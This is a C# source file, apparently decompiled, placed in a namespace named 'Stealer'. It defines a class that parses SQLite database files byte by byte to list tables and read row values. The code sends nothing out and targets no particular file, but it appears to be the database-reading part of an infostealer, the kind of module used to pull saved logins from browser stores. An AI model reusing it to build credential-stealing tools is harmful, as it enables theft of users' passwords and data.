using System;
using System.IO;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Stealer;

public class CNT
{
	private byte[] DataArray { get; }

	private ulong DataEncoding { get; }

	public string[] Fields { get; set; }

	public int RowLength => SqlRows.Length;

	private ushort PageSize { get; }

	private FF[] DataEntries { get; set; }

	private ROW[] SqlRows { get; set; }

	private byte[] SQLDataTypeSize { get; }

	public CNT(string baseName)
	{
		SQLDataTypeSize = new byte[10] { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };
		if (File.Exists(baseName))
		{
			FileSystem.FileOpen(1, baseName, (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
			string s = Strings.Space((int)FileSystem.LOF(1));
			FileSystem.FileGet(1, ref s, -1L, false);
			FileSystem.FileClose(new int[1] { 1 });
			DataArray = Encoding.Default.GetBytes(s);
			PageSize = (ushort)ToUInt64(16, 2);
			DataEncoding = ToUInt64(56, 4);
			if (decimal.Compare(new decimal(DataEncoding), 0m) == 0)
			{
				DataEncoding = 1uL;
			}
			ReadDataEntries(100uL);
		}
	}

	public string[] ParseTables()
	{
		string[] array = null;
		int num = 0;
		int num2 = DataEntries.Length - 1;
		for (int i = 0; i <= num2; i++)
		{
			if (DataEntries[i].Type == "table")
			{
				array = (string[])Utils.CopyArray((Array)array, (Array)new string[num + 1]);
				array[num] = DataEntries[i].Name;
				num++;
			}
		}
		return array;
	}

	public string ParseValue(int rowIndex, int fieldIndex)
	{
		if (rowIndex >= SqlRows.Length)
		{
			return null;
		}
		if (fieldIndex >= SqlRows[rowIndex].RowData.Length)
		{
			return null;
		}
		return SqlRows[rowIndex].RowData[fieldIndex];
	}

	public string ParseValue(int rowIndex, string fieldName)
	{
		int num = -1;
		int num2 = Fields.Length - 1;
		for (int i = 0; i <= num2; i++)
		{
			if (Fields[i].ToLower().Trim().CompareTo(fieldName.ToLower().Trim()) == 0)
			{
				num = i;
				break;
			}
		}
		if (num == -1)
		{
			return null;
		}
		return ParseValue(rowIndex, num);
	}

	public bool ReadTable(string tableName)
	{
		int num = -1;
		int num2 = DataEntries.Length - 1;
		for (int i = 0; i <= num2; i++)
		{
			if (DataEntries[i].Name.ToLower().CompareTo(tableName.ToLower()) == 0)
			{
				num = i;
				break;
			}
		}
		if (num == -1)
		{
			return false;
		}
		string[] array = DataEntries[num].SqlStatement.Substring(DataEntries[num].SqlStatement.IndexOf("(") + 1).Split(new char[1] { ',' });
		int num3 = array.Length - 1;
		for (int j = 0; j <= num3; j++)
		{
			array[j] = array[j].TrimStart(new char[0]);
			int num4 = array[j].IndexOf(" ");
			if (num4 > 0)
			{
				array[j] = array[j].Substring(0, num4);
			}
			if (array[j].IndexOf("UNIQUE") == 0)
			{
				break;
			}
			Fields = (string[])Utils.CopyArray((Array)Fields, (Array)new string[j + 1]);
			Fields[j] = array[j];
		}
		return ReadDataEntriesFromOffsets((ulong)((DataEntries[num].RootNum - 1L) * PageSize));
	}

	private ulong ToUInt64(int startIndex, int Size)
	{
		if (Size <= 8 && Size != 0)
		{
			ulong num = 0uL;
			for (int i = 0; i <= Size - 1; i++)
			{
				num = (num << 8) | DataArray[startIndex + i];
			}
			return num;
		}
		return 0uL;
	}

	private long CalcVertical(int startIndex, int endIndex)
	{
		endIndex++;
		byte[] array = new byte[8];
		int num = endIndex - startIndex;
		bool flag = false;
		if (num == 0 || num > 9)
		{
			return 0L;
		}
		if (num != 1)
		{
			if (num == 9)
			{
				flag = true;
			}
			int num2 = 1;
			int num3 = 7;
			int num4 = 0;
			if (flag)
			{
				array[0] = DataArray[endIndex - 1];
				endIndex--;
				num4 = 1;
			}
			for (int i = endIndex - 1; i >= startIndex; i += -1)
			{
				if (i - 1 >= startIndex)
				{
					array[num4] = (byte)(((byte)(DataArray[i] >> ((num2 - 1) & 7)) & (255 >> num2)) | (byte)(DataArray[i - 1] << (num3 & 7)));
					num2++;
					num4++;
					num3--;
				}
				else if (!flag)
				{
					array[num4] = (byte)((byte)(DataArray[i] >> ((num2 - 1) & 7)) & (255 >> num2));
				}
			}
			return BitConverter.ToInt64(array, 0);
		}
		array[0] = (byte)(DataArray[startIndex] & 0x7Fu);
		return BitConverter.ToInt64(array, 0);
	}

	private int GetValues(int startIndex)
	{
		if (startIndex > DataArray.Length)
		{
			return 0;
		}
		int num = startIndex + 8;
		int num2 = startIndex;
		while (true)
		{
			if (num2 <= num)
			{
				if (num2 <= DataArray.Length - 1)
				{
					if ((DataArray[num2] & 0x80) != 128)
					{
						break;
					}
					num2++;
					continue;
				}
				return 0;
			}
			return startIndex + 8;
		}
		return num2;
	}

	public static bool ItIsOdd(long value)
	{
		return (value & 1L) == 1L;
	}

	private void ReadDataEntries(ulong Offset)
	{
		if (DataArray[(uint)Offset] == 13)
		{
			ushort num = (ToUInt64((Offset.ForceTo<decimal>() + 3m).ForceTo<int>(), 2).ForceTo<decimal>() - 1m).ForceTo<ushort>();
			int num2 = 0;
			if (DataEntries != null)
			{
				num2 = DataEntries.Length;
				DataEntries = (FF[])Utils.CopyArray((Array)DataEntries, (Array)new FF[DataEntries.Length + num + 1]);
			}
			else
			{
				DataEntries = new FF[num + 1];
			}
			int num3 = num;
			for (int i = 0; i <= num3; i++)
			{
				ulong num4 = ToUInt64((Offset.ForceTo<decimal>() + 8m + (i * 2).ForceTo<decimal>()).ForceTo<int>(), 2);
				if (decimal.Compare(Offset.ForceTo<decimal>(), 100m) != 0)
				{
					num4 += Offset;
				}
				int values = GetValues(num4.ForceTo<int>());
				CalcVertical(num4.ForceTo<int>(), values);
				int values2 = GetValues((num4.ForceTo<decimal>() + values.ForceTo<decimal>() - num4.ForceTo<decimal>() + 1m).ForceTo<int>());
				DataEntries[num2 + i].ID = CalcVertical((num4.ForceTo<decimal>() + values.ForceTo<decimal>() - num4.ForceTo<decimal>() + 1m).ForceTo<int>(), values2);
				num4 = (num4.ForceTo<decimal>() + values2.ForceTo<decimal>() - num4.ForceTo<decimal>() + 1m).ForceTo<ulong>();
				values = GetValues(num4.ForceTo<int>());
				values2 = values;
				long value = CalcVertical(num4.ForceTo<int>(), values);
				long[] array = new long[5];
				int num5 = 0;
				do
				{
					values = values2 + 1;
					values2 = GetValues(values);
					array[num5] = CalcVertical(values, values2);
					if (array[num5] <= 9L)
					{
						array[num5] = SQLDataTypeSize[(int)array[num5]];
					}
					else if (ItIsOdd(array[num5]))
					{
						array[num5] = (long)Math.Round((double)(array[num5] - 13L) / 2.0);
					}
					else
					{
						array[num5] = (long)Math.Round((double)(array[num5] - 12L) / 2.0);
					}
					num5++;
				}
				while (num5 <= 4);
				Encoding encoding = Encoding.Default;
				decimal value2 = DataEncoding.ForceTo<decimal>();
				if (!1m.Equals(value2))
				{
					if (!2m.Equals(value2))
					{
						if (3m.Equals(value2))
						{
							encoding = Encoding.BigEndianUnicode;
						}
					}
					else
					{
						encoding = Encoding.Unicode;
					}
				}
				else
				{
					encoding = Encoding.Default;
				}
				DataEntries[num2 + i].Type = encoding.GetString(DataArray, Convert.ToInt32(decimal.Add(new decimal(num4), new decimal(value))), (int)array[0]);
				DataEntries[num2 + i].Name = encoding.GetString(DataArray, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0]))), (int)array[1]);
				DataEntries[num2 + i].RootNum = (long)ToUInt64(Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2]))), (int)array[3]);
				DataEntries[num2 + i].SqlStatement = encoding.GetString(DataArray, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
			}
		}
		else
		{
			if (DataArray[(uint)Offset] != 5)
			{
				return;
			}
			int num6 = Convert.ToUInt16(decimal.Subtract(new decimal(ToUInt64(Convert.ToInt32(decimal.Add(new decimal(Offset), 3m)), 2)), 1m));
			for (int j = 0; j <= num6; j++)
			{
				ushort num7 = (ushort)ToUInt64(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12m), new decimal(j * 2))), 2);
				if (decimal.Compare(new decimal(Offset), 100m) == 0)
				{
					ReadDataEntries(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ToUInt64(num7, 4)), 1m), new decimal(PageSize))));
				}
				else
				{
					ReadDataEntries(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ToUInt64((int)(Offset + num7), 4)), 1m), new decimal(PageSize))));
				}
			}
			ReadDataEntries(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ToUInt64(Convert.ToInt32(decimal.Add(new decimal(Offset), 8m)), 4)), 1m), new decimal(PageSize))));
		}
	}

	private bool ReadDataEntriesFromOffsets(ulong Offset)
	{
		if (DataArray[(uint)Offset] == 13)
		{
			int num = Convert.ToInt32(decimal.Subtract(new decimal(ToUInt64(Convert.ToInt32(decimal.Add(new decimal(Offset), 3m)), 2)), 1m));
			int num2 = 0;
			if (SqlRows != null)
			{
				num2 = SqlRows.Length;
				SqlRows = (ROW[])Utils.CopyArray((Array)SqlRows, (Array)new ROW[SqlRows.Length + num + 1]);
			}
			else
			{
				SqlRows = new ROW[num + 1];
			}
			int num3 = num;
			for (int i = 0; i <= num3; i++)
			{
				SZ[] array = null;
				ulong num4 = ToUInt64(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 8m), new decimal(i * 2))), 2);
				if (decimal.Compare(new decimal(Offset), 100m) != 0)
				{
					num4 += Offset;
				}
				int values = GetValues((int)num4);
				CalcVertical((int)num4, values);
				int values2 = GetValues(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(values), new decimal(num4))), 1m)));
				SqlRows[num2 + i].ID = CalcVertical(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(values), new decimal(num4))), 1m)), values2);
				num4 = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(values2), new decimal(num4))), 1m));
				values = GetValues((int)num4);
				values2 = values;
				long num5 = CalcVertical((int)num4, values);
				long num6 = Convert.ToInt64(decimal.Add(decimal.Subtract(new decimal(num4), new decimal(values)), 1m));
				int num7 = 0;
				while (num6 < num5)
				{
					array = (SZ[])Utils.CopyArray((Array)array, (Array)new SZ[num7 + 1]);
					values = values2 + 1;
					values2 = GetValues(values);
					array[num7].Type = CalcVertical(values, values2);
					if (array[num7].Type > 9L)
					{
						if (ItIsOdd(array[num7].Type))
						{
							array[num7].Size = (long)Math.Round((double)(array[num7].Type - 13L) / 2.0);
						}
						else
						{
							array[num7].Size = (long)Math.Round((double)(array[num7].Type - 12L) / 2.0);
						}
					}
					else
					{
						array[num7].Size = SQLDataTypeSize[(int)array[num7].Type];
					}
					num6 = num6 + (values2 - values) + 1L;
					num7++;
				}
				SqlRows[num2 + i].RowData = new string[array.Length - 1 + 1];
				int num8 = 0;
				int num9 = array.Length - 1;
				for (int j = 0; j <= num9; j++)
				{
					if (array[j].Type > 9L)
					{
						if (!ItIsOdd(array[j].Type))
						{
							if (decimal.Compare(new decimal(DataEncoding), 1m) == 0)
							{
								SqlRows[num2 + i].RowData[j] = Encoding.Default.GetString(DataArray, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num5)), new decimal(num8))), (int)array[j].Size);
							}
							else if (decimal.Compare(new decimal(DataEncoding), 2m) == 0)
							{
								SqlRows[num2 + i].RowData[j] = Encoding.Unicode.GetString(DataArray, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num5)), new decimal(num8))), (int)array[j].Size);
							}
							else if (decimal.Compare(new decimal(DataEncoding), 3m) == 0)
							{
								SqlRows[num2 + i].RowData[j] = Encoding.BigEndianUnicode.GetString(DataArray, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num5)), new decimal(num8))), (int)array[j].Size);
							}
						}
						else
						{
							SqlRows[num2 + i].RowData[j] = Encoding.Default.GetString(DataArray, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num5)), new decimal(num8))), (int)array[j].Size);
						}
					}
					else
					{
						SqlRows[num2 + i].RowData[j] = Convert.ToString(ToUInt64(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num5)), new decimal(num8))), (int)array[j].Size));
					}
					num8 += (int)array[j].Size;
				}
			}
		}
		else if (DataArray[(uint)Offset] == 5)
		{
			int num10 = Convert.ToUInt16(decimal.Subtract(new decimal(ToUInt64(Convert.ToInt32(decimal.Add(new decimal(Offset), 3m)), 2)), 1m));
			for (int k = 0; k <= num10; k++)
			{
				ushort num11 = (ushort)ToUInt64(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12m), new decimal(k * 2))), 2);
				ReadDataEntriesFromOffsets(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ToUInt64((int)(Offset + num11), 4)), 1m), new decimal(PageSize))));
			}
			ReadDataEntriesFromOffsets(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ToUInt64(Convert.ToInt32(decimal.Add(new decimal(Offset), 8m)), 4)), 1m), new decimal(PageSize))));
		}
		return true;
	}
}
